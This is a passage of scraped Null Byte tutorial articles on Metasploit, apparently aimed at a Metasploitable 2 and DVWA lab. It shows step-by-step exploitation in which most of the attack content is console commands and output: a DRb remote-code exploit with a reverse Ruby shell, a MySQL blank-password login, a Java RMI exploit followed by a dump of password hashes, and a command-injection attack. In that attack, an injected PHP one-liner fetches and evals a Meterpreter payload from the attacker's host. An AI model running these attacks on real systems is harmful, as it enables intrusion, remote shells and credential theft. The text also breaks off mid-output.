Description\n----                                ---------------  ----    -----  -----------\ncmd/unix/bind_awk                                    normal  No     Unix Command Shell, Bind TCP (via AWK)\ncmd/unix/bind_busybox_telnetd                        normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)\ncmd/unix/bind_lua                                    normal  No     Unix Command Shell, Bind TCP (via Lua)\ncmd/unix/bind_netcat                                 normal  No     Unix Command Shell, Bind TCP (via netcat)\ncmd/unix/bind_netcat_gaping                          normal  No     Unix Command Shell, Bind TCP (via netcat -e)\ncmd/unix/bind_netcat_gaping_ipv6                     normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6\ncmd/unix/bind_nodejs                                 normal  No     Unix Command Shell, Bind TCP (via nodejs)\ncmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)\ncmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6\ncmd/unix/bind_r                                      normal  No     Unix Command Shell, Bind TCP (via R)\ncmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)\ncmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6\ncmd/unix/bind_socat_udp                              normal  No     Unix Command Shell, Bind UDP (via socat)\ncmd/unix/bind_stub                                   normal  No     Unix Command Shell, Bind TCP (stub)\ncmd/unix/bind_zsh                                    normal  No     Unix Command Shell, Bind TCP (via Zsh)\ncmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution\ncmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)\ncmd/unix/reverse_awk                                 normal  No     Unix Command Shell, Reverse TCP (via AWK)\ncmd/unix/reverse_bash                                normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)\ncmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)\ncmd/unix/reverse_ksh                                 normal  No     Unix Command Shell, Reverse TCP (via Ksh)\ncmd/unix/reverse_lua                                 normal  No     Unix Command Shell, Reverse TCP (via Lua)\ncmd/unix/reverse_ncat_ssl                            normal  No     Unix Command Shell, Reverse TCP (via ncat)\ncmd/unix/reverse_netcat                              normal  No     Unix Command Shell, Reverse TCP (via netcat)\ncmd/unix/reverse_netcat_gaping                       normal  No     Unix Command Shell, Reverse TCP (via netcat -e)\ncmd/unix/reverse_nodejs                              normal  No     Unix Command Shell, Reverse TCP (via nodejs)\ncmd/unix/reverse_openssl                             normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)\ncmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)\ncmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)\ncmd/unix/reverse_php_ssl                             normal  No     Unix Command Shell, Reverse TCP SSL (via php)\ncmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)\ncmd/unix/reverse_python_ssl                          normal  No     Unix Command Shell, Reverse TCP SSL (via python)\ncmd/unix/reverse_r                                   normal  No     Unix Command Shell, Reverse TCP (via R)\ncmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)\ncmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)\ncmd/unix/reverse_socat_udp                           normal  No     Unix Command Shell, Reverse UDP (via socat)\ncmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)\ncmd/unix/reverse_stub                                normal  No     Unix Command Shell, Reverse TCP (stub)\ncmd/unix/reverse_zsh                                 normal  No     Unix Command Shell, Reverse TCP (via Zsh)\ngeneric/custom                                       normal  No     Custom Payload\ngeneric/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline\ngeneric/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline\nAs you can see, there are quite a bit of options here. For now, we will use a reverse command shell in Ruby. Use set payload to assign the appropriate payload.\nmsf exploit(linux/misc/drb_remote_codeexec) > set payload cmd/unix/reverse_ruby\npayload => cmd/unix/reverse_ruby\nNow, we can display the current settings to see where we are at. Use the options command.\nmsf exploit(linux/misc/drb_remote_codeexec) > options\nModule options (exploit/linux/misc/drb_remote_codeexec):\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nRHOST  172.16.1.102     no        The target address\nRPORT  8787             yes       The target port\nURI                     no        The URI of the target host (druby://host:port) (overrides RHOST/RPORT)\nPayload options (cmd/unix/reverse_ruby):\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nLHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port\nExploit target:\n0   Automatic\nSince we specified a reverse shell as our payload, we need to set a listening address for the shell to call back to — this will be the IP address of our local machine. Use set lhost to assign this now.\nmsf exploit(linux/misc/drb_remote_codeexec) > set lhost 172.16.1.100\nlhost => 172.16.1.100\nStep 4: Get a Shell\nWe should be good to go. Type exploit at the prompt, or run, which does the exact same thing but is just shorter. We should see the attack launch and try a couple of methods to exploit the target.\nmsf exploit(linux/misc/drb_remote_codeexec) > run\n[*] Started reverse TCP handler on 172.16.1.100:4444\n[*] Trying to exploit instance_eval method\n[!] Target is not vulnerable to instance_eval method\n[*] Trying to exploit syscall method\n[*] attempting x86 execve of .JU4AK4Gh3sOBkaB7\n[+] Deleted .JU4AK4Gh3sOBkaB7\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue\nlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\ninet6 ::1/128 scope host\nvalid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000\nlink/ether 08:00:27:77:62:6c brd ff:ff:ff:ff:ff:ff\ninet 172.16.1.102/12 brd 172.31.255.255 scope global eth0\ninet6 fe80::a00:27ff:fe77:626c/64 scope link\nvalid_lft forever preferred_lft forever\nOnce it's successful, there should be a blinking cursor as the prompt. We can now execute any command we want, like whoami to view the current user, uname -a to display system information, and ip address to verify that we have a shell on the target system. Since we now have a root shell, we own the system and can basically do whatever we want.\nWrapping Up\nIn this article, we learned how a simple service intended to provide enhanced functionality to programs was able to be exploited with the goal of attaining root access. Since Distributed Ruby was designed to allow remote communication between processes, inherent security holes were inadvertently opened up. We saw how easily we were able to get a root-level shell on the target system, once again proving just how powerful Metasploit really is.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Use Metasploit's Database to Stay Organized & Store Information While Hacking",
        "link": "https://null-byte.wonderhowto.com/how-to/use-metasploits-database-stay-organized-store-information-while-hacking-0192643/",
        "content": "* WonderHowTo\nThe ability to stay organized and be resourceful with data gathered from recon is one of the things that separates the true hackers from the script kiddies. Metasploit contains a built-in database that allows for efficient storage of information and the ability to utilize that information to better understand the target, which ultimately leads to more successful exploitation.\nBy understanding and using the built-in Metasploit database to the fullest, we can keep track of information and stay organized during intense hacks. Also, there's being able to set up the database, customize workspaces, store scan results from Nmap, and gather and view discovered information such as services, credentials, and password hashes.\nI'm using Metasploit and Kali Linux on the offensive, and Metasploitable 2 as my target. Your results will be similar on other Linux distros against other targets.\nInitial Setup & Workspaces\nThe first thing we need to do, if it is not done already, is start the PostgreSQL service that Metasploit's database uses, with the systemctl start postgresql command.\nsystemctl start postgresql\nAt any time, we can use the status keyword to check the current state of the service.\nsystemctl status postgresql\n● postgresql.service - PostgreSQL RDBMS\nLoaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)\nActive: active (exited) since Tue 2019-01-15 09:11:42 CST; 1min 6s ago\nProcess: 1708 ExecStart=/bin/true (code=exited, status=0/SUCCESS)\nMain PID: 1708 (code=exited, status=0/SUCCESS)\nJan 15 09:11:42 drd systemd[1]: Starting PostgreSQL RDBMS...\nJan 15 09:11:42 drd systemd[1]: Started PostgreSQL RDBMS.\nWe can initialize the actual database with the msfdb command, which creates the default user, database, and relevant information pertaining to the database.\n[+] Starting database\n[+] Creating database user 'msf'\n[+] Creating databases 'msf'\n[+] Creating databases 'msf_test'\n[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'\n[+] Creating initial database schema\nThis will probably already have been done since it is a necessary step in order to use Metasploit at all. Regardless, we can check on the status similar to before.\nmsfdb status\n● postgresql.service - PostgreSQL RDBMS\nLoaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)\nActive: active (exited) since Tue 2019-01-15 09:14:03 CST; 59s ago\nProcess: 1893 ExecStart=/bin/true (code=exited, status=0/SUCCESS)\nMain PID: 1893 (code=exited, status=0/SUCCESS)\nJan 15 09:14:03 drd systemd[1]: Starting PostgreSQL RDBMS...\nJan 15 09:14:03 drd systemd[1]: Started PostgreSQL RDBMS.\nCOMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npostgres 1857 postgres    3u  IPv6  39550      0t0  TCP localhost:5432 (LISTEN)\npostgres 1857 postgres    6u  IPv4  39551      0t0  TCP localhost:5432 (LISTEN)\nUID        PID  PPID  C STIME TTY      STAT   TIME CMD\npostgres  1857     1  0 09:14 ?        S      0:00 /usr/lib/postgresql/10/bin/postgres -D /var/lib/postgresql/10/main -c config_file=/etc/postgresql/1\n[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)\nNow we can launch Metasploit using the msfconsole command.\n_                                                    _\n/ \\    /\\         __                         _   __  /_/ __\n| |\\  / | _____   \\ \\           ___   _____ | | /  \\ _   \\ \\\n| | \\/| | | ___\\ |- -|   /\\    / __\\ | -__/ | || | || | |- -|\n|_|   | | | _|__  | |_  / -\\ __\\ \\   | |    | | \\__/| |  | |_\n|/  |____/  \\___\\/ /\\ \\\\___/   \\/     \\__|    |_\\  \\___\\\n=[ metasploit v4.17.17-dev                         ]\n+ -- --=[ 1817 exploits - 1031 auxiliary - 315 post       ]\n+ -- --=[ 539 payloads - 42 encoders - 10 nops            ]\n+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\nOnce it is up and running, use the help keyword or ? to display the help menu. Near the bottom, there will be a section for database commands.\nDatabase Backend Commands\n=========================\nCommand           Description\n-------           -----------\ndb_connect        Connect to an existing database\ndb_disconnect     Disconnect from the current database instance\ndb_export         Export a file containing the contents of the database\ndb_import         Import a scan result file (filetype will be auto-detected)\ndb_nmap           Executes nmap and records the output automatically\ndb_rebuild_cache  Rebuilds the database-stored module cache\ndb_status         Show the current database status\nhosts             List all hosts in the database\nloot              List all loot in the database\nnotes             List all notes in the database\nservices          List all services in the database\nvulns             List all vulnerabilities in the database\nworkspace         Switch between database workspaces\nWe can check on the status from here as well:\nmsf > db_status\n[*] postgresql connected to msf\nMetasploit uses workspaces to keep track of different information, allowing for separate scans and sessions to be utilized simultaneously. This keeps everything organized and in order. To view the current workspace, use the workspace keyword.\nmsf > workspace\nWe can see that our only option available is the default workspace. We can take a look at the different options for this command with the -h flag.\nmsf > workspace -h\nworkspace                  List workspaces\nworkspace -v               List workspaces verbosely\nworkspace [name]           Switch workspace\nworkspace -a [name] ...    Add workspace(s)\nworkspace -d [name] ...    Delete workspace(s)\nworkspace -D               Delete all workspaces\nworkspace -r <old> <new>   Rename workspace\nworkspace -h               Show this help information\nFor instance, we have the ability to add a workspace with the -a flag.\nmsf > workspace -a myworkspace\n[*] Added workspace: myworkspace\nCreating a new workspace will automatically switch you over to it.\nmsf > workspace\n* myworkspace\nAnd moving between workspaces is easy, using just its name after workplace.\nmsf > workspace default\n[*] Workspace: default\nTo delete a workspace, use the -d flag.\nmsf > workspace -d myworkspace\n[*] Deleted workspace: myworkspace\nThe workspace feature is extremely useful for staying organized while on a pentest or while hacking in general.\nAnother powerful feature of Metasploit's database is the ability to interface with Nmap. Being able to have the results of any Nmap scan stored at your fingertips makes recon so much easier and effective. We can import the saved results of a scan with the db_import command, followed by the file location.\nmsf > db_import /root/myscan\n[*] Importing 'Nmap XML' data\n[*] Import: Parsing with 'Nokogiri v1.9.1'\n[*] Importing host 172.16.1.102\n[*] Successfully imported /root/myscan\nWe also have the ability to perform an Nmap scan directly from the console. Just use the db_nmap command followed by any options you would normally use for a scan.\nmsf > db_nmap -A 172.16.1.102\n[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 09:33 CST\n[*] Nmap: Nmap scan report for 172.16.1.102\n[*] Nmap: Host is up (0.0014s latency).\n[*] Nmap: Not shown: 977 closed ports\n[*] Nmap: PORT     STATE SERVICE     VERSION\n[*] Nmap: 21/tcp   open  ftp         vsftpd 2.3.4\n[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n[*] Nmap: | ftp-syst:\n[*] Nmap: |   STAT:\n[*] Nmap: | FTP server status:\n[*] Nmap: |      Connected to 172.16.1.100\n[*] Nmap: |      Logged in as ftp\n[*] Nmap: |      TYPE: ASCII\n[*] Nmap: |      No session bandwidth limit\n[*] Nmap: |      Session timeout in seconds is 300\n[*] Nmap: |      Control connection is plain text\n[*] Nmap: |      Data connections will be plain text\n[*] Nmap: |      vsFTPd 2.3.4 - secure, fast, stable\n[*] Nmap: |_End of status\nFrom here, the results of the scan will be stored in the database for us to use as we see fit.\nHosts & Services\nNow that we have scanned our target, let's display some information about it. Simply use the hosts command to list information about the current targets stored in the database.\nmsf > hosts\naddress       mac                name  os_name  os_flavor  os_sp  purpose  info  comments\n-------       ---                ----  -------  ---------  -----  -------  ----  --------\n172.16.1.102  08:00:27:77:62:6c        Linux               2.6.X  server\nWe can see the IP and MAC address here, as well as operating system information. Use the -h flag to list all the options for interacting with a host.\nmsf > hosts -h\nUsage: hosts [ options ] [addr1 addr2 ...]\n-a,--add          Add the hosts instead of searching\n-d,--delete       Delete the hosts instead of searching\n-c <col1,col2>    Only show the given columns (see list below)\n-C <col1,col2>    Only show the given columns until the next restart (see list below)\n-h,--help         Show this help information\n-u,--up           Only show hosts which are up\n-o <file>         Send output to a file in csv format\n-O <column>       Order rows by specified column number\n-R,--rhosts       Set RHOSTS from the results of the search\n-S,--search       Search string to filter by\n-i,--info         Change the info of a host\n-n,--name         Change the name of a host\n-m,--comment      Change the comment of a host\n-t,--tag          Add or specify a tag to a range of hosts\nAvailable columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count,\nWe can add or delete hosts manually, modify the info and add comments, and various other housekeeping tasks here. One useful option is the ability to list only certain columns — use the -c flag followed by a comma-separated list of the columns to be shown.\nmsf > hosts -c address,os_name\naddress       os_name\n-------       -------\n172.16.1.102  Linux\nWe can also display a list of services that were discovered by the Nmap scan from earlier with the services command.\nmsf > services\nhost          port  proto  name         state  info\n----          ----  -----  ----         -----  ----\n172.16.1.102  21    tcp    ftp          open   vsftpd 2.3.4\n172.16.1.102  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0\n172.16.1.102  23    tcp    telnet       open   Linux telnetd\n172.16.1.102  25    tcp    smtp         open   Postfix smtpd\n172.16.1.102  53    tcp    domain       open   ISC BIND 9.4.2\n172.16.1.102  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2\n172.16.1.102  111   tcp    rpcbind      open   2 RPC #100000\n172.16.1.102  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP\n172.16.1.102  445   tcp    netbios-ssn  open   Samba smbd 3.0.20-Debian workgroup: WORKGROUP\n172.16.1.102  512   tcp    exec         open   netkit-rsh rexecd\n172.16.1.102  513   tcp    login        open\n172.16.1.102  514   tcp    shell        open   Netkit rshd\n172.16.1.102  1099  tcp    java-rmi     open   Java RMI Registry\n172.16.1.102  1524  tcp    bindshell    open   Metasploitable root shell\n172.16.1.102  2049  tcp    nfs          open   2-4 RPC #100003\n172.16.1.102  2121  tcp    ftp          open   ProFTPD 1.3.1\n172.16.1.102  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5\n172.16.1.102  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7\n172.16.1.102  5900  tcp    vnc          open   VNC protocol 3.3\n172.16.1.102  6000  tcp    x11          open   access denied\n172.16.1.102  6667  tcp    irc          open   UnrealIRCd\n172.16.1.102  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3\n172.16.1.102  8180  tcp    unknown      open   Apache-Coyote/1.1\nThis will show the host, service name, port, and other information relating to the service. Again, we can view more options for this command by tacking on the -h flag.\nmsf > services -h\nUsage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]\n-a,--add          Add the services instead of searching\n-d,--delete       Delete the services instead of searching\n-c <col1,col2>    Only show the given columns\n-h,--help         Show this help information\n-s <name1,name2>  Search for a list of service names\n-p <port1,port2>  Search for a list of ports\n-r <protocol>     Only show [tcp|udp] services\n-u,--up           Only show services which are up\n-o <file>         Send output to a file in csv format\n-O <column>       Order rows by specified column number\n-R,--rhosts       Set RHOSTS from the results of the search\n-S,--search       Search string to filter by\nAvailable columns: created_at, info, name, port, proto, state, updated_at\nSimilar options exist, such as the ability to add and delete services manually, to filter by column name, and to search by keyword.\nmsf > services -S mysql\nhost          port  proto  name   state  info\n----          ----  -----  ----   -----  ----\n172.16.1.102  3306  tcp    mysql  open   MySQL 5.0.51a-3ubuntu5\nCredentials & Loot\nInformation about discovered hosts and services is not the only thing that can be stored in the database. We can also save valuable data like credentials and password hashes. The creds command will display current information about discovered credentials.\nmsf > creds\nCredentials\n===========\nhost  origin  service  public  private  realm  private_type\n----  ------  -------  ------  -------  -----  ------------\nAs you can see, right now there is nothing in there, so let's go enumerate some login info.\nMetasploit has an auxiliary scanner that can probe MySQL for valid credentials. Let's run that against our target using the root account and a blank password.\nmsf auxiliary(scanner/mysql/mysql_login) > run\n[+] 172.16.1.102:3306     - 172.16.1.102:3306 - Found remote MySQL version 5.0.51a\n[+] 172.16.1.102:3306     - 172.16.1.102:3306 - Success: 'root:'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nIt looks like it was successful, so now we can check if the database was populated with those credentials.\nmsf > creds\nCredentials\n===========\nhost          origin        service           public  private  realm  private_type\n----          ------        -------           ------  -------  -----  ------------\n172.16.1.102  172.16.1.102  3306/tcp (mysql)  root                    Blank password\nWe can now see information about the host and service, as well as the login info under root with a blank password. There are more options for credentials beyond this basic usage, which can be viewed with the -h flag.\nmsf > creds -h\nWith no sub-command, list credentials. If an address range is\ngiven, show only credentials with logins on hosts within that\nUsage - Listing credentials:\ncreds [filter options] [address range]\nUsage - Adding credentials:\ncreds add uses the following named parameters.\nuser      :  Public, usually a username\npassword  :  Private, private_type Password.\nntlm      :  Private, private_type NTLM Hash.\nssh-key   :  Private, private_type SSH key, must be a file path.\nhash      :  Private, private_type Nonreplayable hash\nrealm     :  Realm,\nrealm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.\nWe also have the ability to store other discovered information such as password hashes. To view current findings, use the loot command.\nhost  service  type  name  content  info  path\n----  -------  ----  ----  -------  ----  ----\nAgain, we haven't done anything yet so there is nothing here yet. Let's see if we can gather some hashes from our target.\nFirst, we'll need to compromise it and get a root shell. We can do this in a number of ways, but for now we can exploit a vulnerability found in a Java service. Once we execute the attack, we can background the session.\nmsf exploit(multi/misc/java_rmi_server) > run\n[*] Started reverse TCP handler on 172.16.1.100:4444\n[*] 172.16.1.102:1099 - Using URL: http://0.0.0.0:8080/fbz8uGK4rg1dea\n[*] 172.16.1.102:1099 - Local IP: http://172.16.1.100:8080/fbz8uGK4rg1dea\n[*] 172.16.1.102:1099 - Server started.\n[*] 172.16.1.102:1099 - Sending RMI Header...\n[*] 172.16.1.102:1099 - Sending RMI Call...\n[*] 172.16.1.102:1099 - Replied to request for payload JAR\n[*] Sending stage (2952 bytes) to 172.16.1.102\n[*] 172.16.1.102:1099 - Server stopped.\nBackground session 1? [y/N]  y\nNext, we can use a post-exploitation module to get the hashes from this system. Use the session that we just backgrounded and run the exploit.\nmsf post(linux/gather/hashdump) > options\nModule options (post/linux/gather/hashdump):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSESSION                   yes       The session to run this module on.\nmsf post(linux/gather/hashdump) > set session 1\nsession => 1\nmsf post(linux/gather/hashdump) > run\n[!] SESSION may not be compatible with this module.\n[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash\n[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh\n[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false\n[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\n[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash\n[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash\n[+] Unshadowed Password File: /root/.msf4/loot/20190115095943_default_172.16.1.102_linux.hashes_722705.txt\n[*] Post module execution completed\nIt looks like it found some hashes, but let's check the database now for loot.\nhost          service  type          name                   content     info                            path\n----          -------  ----          ----                   -------     ----                            ----\n172.16.1.102           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20190115095943_default_172.16.1.102_linux.hashes_722705.txt\n172.16.1.102           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20190115095943_default_172.16.1.102_linux.passwd_635591.txt\n172.16.1.102           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20190115095943_default_172.16.1.102_linux.shadow_881518.txt\nNow we can see information about the hashes we found, such as the type and file path. Like the other features of the database, we can see a few more options for loot by displaying the help.\nmsf > loot -h\nUsage: loot <options>\nInfo: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]\nAdd: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]\nDel: loot -d [addr1 addr2 ...]\n-a,--add          Add loot to the list of addresses, instead of listing\n-d,--delete       Delete *all* loot matching host and type\n-f,--file         File with contents of the loot to add\n-i,--info         Info of the loot to add\n-t <type1,type2>  Search for a list of types\n-h,--help         Show this help information\n-S,--search       Search string to filter by\nAll of this data we have stored is basically useless if we cannot save it for later. Luckily, we can do just that with the db_export command.\nmsf > db_export -h\ndb_export -f <format> [filename]\nFormat can be one of: xml, pwdump\n[-] No output file was specified\nSimply specify the file format and the path to write to, and all the information stored in the database will be exported to a file for later use.\nmsf > db_export -f xml /root/mydbinfo.xml\n[*] Starting export of workspace default to /root/mydbinfo.xml [ xml ]...\n[*]     >> Starting export of report\n[*]     >> Starting export of hosts\n[*]     >> Starting export of events\n[*]     >> Starting export of services\n[*]     >> Starting export of web sites\n[*]     >> Starting export of web pages\n[*]     >> Starting export of web forms\n[*]     >> Starting export of web vulns\n[*]     >> Starting export of module details\n[*]     >> Finished export of report\n[*] Finished export of workspace default to /root/mydbinfo.xml [ xml ]...\nIn this article, we explored a little-known feature of Metasploit that allows us to keep track of information and stay organized while hacking. We covered how to set up the database and customize workspaces, how to utilize Nmap to store scan results, and gather and view discovered information such as services, credentials, and password hashes. The ability to store and manage data right in Metasploit allows us to stay organized and ultimately become a more successful hacker.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Use Metasploit's Web Delivery Script & Command Injection to Pop a Shell",
        "link": "https://null-byte.wonderhowto.com/how-to/use-metasploits-web-delivery-script-command-injection-pop-shell-0189130/",
        "content": "* WonderHowTo\nOne of the best ways to improve your skills as a hacker is to learn to combine different avenues of attack to achieve success. What if it were possible to get a victim to connect to our machine and execute a chosen payload on our behalf? This is indeed possible with the almighty Metasploit and the aid of a technique known as command injection.\nToday, we will be using Kali Linux and Metasploit to attack the vulnerable web application DVWA, included as part of the Metasploitable 2 virtual machine.\nWeb Delivery Overview\nMetasploit contains a useful module that hosts a payload on a server created on the attacking machine. The web delivery script is run once the target machine connects to the server and the payload is then executed. This module is versatile as it can target Python, Powershell, and PHP applications.\n* Don't Miss: Obfuscate Payloads & Evade Antivirus Detection with MSFconsole\nThe web delivery scripts primary advantage is stealth. The server and payload are both hosted on the attacking machine, so when the exploit is carried out, there is nothing written to disk on the target, making it less likely to trigger antivirus applications and other defenses.\nThe one caveat of this exploit is that it needs a means of executing commands on the target to kick the script off. One possible method that is ideal for this situation is command injection.\nCommand Injection Primer\nCommand injection is a type of attack in which arbitrary operating system commands are executed on the host via a vulnerable web application. Usually, this occurs when an application passes unsafe user input from a form to the server, but this can also happen with cookies, HTTP headers, and other sources of data.\nThis type of vulnerability is especially dangerous because of the intrinsic power of system commands. Depending on the level of privilege an application is running with, command injection can lead to an attacker owning an entire system.\nStep 1: Fire Up DVWA\nThe first thing we need to do is open DVWA and log in using the default credentials.\nNext, browse to the \"DVWA Security\" tab and set the security level to \"low\" to make sure our exploit is run without any hiccups when we're ready.\nStep 2: Find a Vulnerable Entry Point\nNow we can navigate to the \"Command Execution\" page. For this attack to work, we have to ensure that the target application can communicate with our local machine. We can take advantage of the default functionality of this page to ping our attacking machine. Just enter the IP address and hit \"submit.\"\nAfter receiving a successful reply, the next thing we need to do is determine if this page is vulnerable to command injection. We can do so by appending an operating system command to the IP address we entered. Here, we will add the ls command with the && symbol and hit \"submit\" again.\nWe can see that the application responded with the contents of the current directory at the bottom, which means that a command injection vulnerability does indeed exist. We will take advantage of this to launch our web delivery script next.\nStep 3: Launch Web Delivery Script\nFire up Metasploit by typing msfconsole in the terminal. We can load the web delivery module with the following command.\nmsf > use exploit/multi/script/web_delivery\nAt the prompt, type options to display the current setting for this module.\nmsf exploit(multi/script/web_delivery) > options\nModule options (exploit/multi/script/web_delivery):\nName     Current Setting  Required  Description\n----     ---------------  --------  -----------\nSRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT  8080             yes       The local port to listen on.\nSSL      false            no        Negotiate SSL for incoming connections\nSSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                   no        The URI to use for this exploit (default is random)\nPayload options (python/meterpreter/reverse_tcp):\nName   Current Setting  Required  Description\n----   ---------------  --------  -----------\nLHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port\nExploit target:\nWe need to choose the appropriate target type, which, in this case, is PHP. Please note that for this module to work correctly, the target needs to be set before the payload is chosen. Type show targets to get a list of available options.\nmsf exploit(multi/script/web_delivery) > show targets\nExploit targets:\n3   Regsvr32\n4   PSH (Binary)\nNow we can set the rest of our options. Perform each command as shown below in order. For set target, it's an ID from the list above. The set payload is the payload we're using, in this case, php/meterpreter/reverse_tcp. For set lhost, it's the listening host address. And for set lport, it's our listening port.\nmsf exploit(multi/script/web_delivery) > set target 1\ntarget => 1\nmsf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp\npayload => php/meterpreter/reverse_tcp\nmsf exploit(multi/script/web_delivery) > set lhost 172.16.1.100\nlhost => 172.16.1.100\nmsf exploit(multi/script/web_delivery) > set lport 1234\nlport => 1234\nFinally, we are ready to launch the attack. Type run at the prompt to start the exploit. The server on our local machine will start. The last line provided by running the exploit, as seen below, is important because it shows the command that needs to be executed on the target system.\nmsf exploit(multi/script/web_delivery) > run\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 172.16.1.100:1234\n[*] Using URL: http://0.0.0.0:8080/ko3Rb1zps9VTa\n[*] Local IP: http://172.16.1.100:8080/ko3Rb1zps9VTa\n[*] Server started.\n[*] Run the following command on the target machine:\nphp -d allow_url_fopen=true -r \"eval(file_get_contents('http://172.16.1.100:8080/ko3Rb1zps9VTa'));\"\nStep 4: Run the Attack\nWe can use the command injection vulnerability that we discovered earlier as an easy means of attacking. So copy the last line and append it to the IP address with && in the \"Command Execution\" page in DVWA, just like we did earlier when seeing if the page was vulnerable in the first place.\nIf everything goes according to plan, once we hit \"submit,\" our payload will execute and a Meterpreter session will be opened. Back in the terminal, we can see that this is exactly what happens.\nmsf exploit(multi/script/web_delivery) > [*] 172.16.1.102     web_delivery - Delivering Payload\n[*] Sending stage (37775 bytes) to 172.16.1.102\n[*] Meterpreter session 1 opened (172.16.1.100:1234 -> 172.16.1.102:57343) at 2018-10-22 11:12:05 -0500\nWe are not automatically dropped into the session, though, so we can use the sessions command to view the active sessions that are open.\nmsf exploit(multi/script/web_delivery) > sessions\nActive sessions\n===============\nId  Name  Type                   Information                     Connection\n--  ----  ----                   -----------                     ----------\n1         meterpreter php/linux  www-data (33) @ metasploitable  172.16.1.100:1234 -> 172.16.1.102:57343 (172.16.1.102)\nTo interact with an active session, use the sessions -i command followed by the appropriate session ID number.\nmsf exploit(multi/script/web_delivery) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > getuid\nServer username: www-data (33)\nmeterpreter > sysinfo\nComputer    : metasploitable\nOS          : Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686\nMeterpreter : php/linux\nNow we can run Meterpreter commands like getuid and sysinfo to display information about the target machine. We can also drop into a shell by using the shell command.\nmeterpreter > shell\nProcess 4869 created.\nChannel 0 created.\nLinux metasploitable 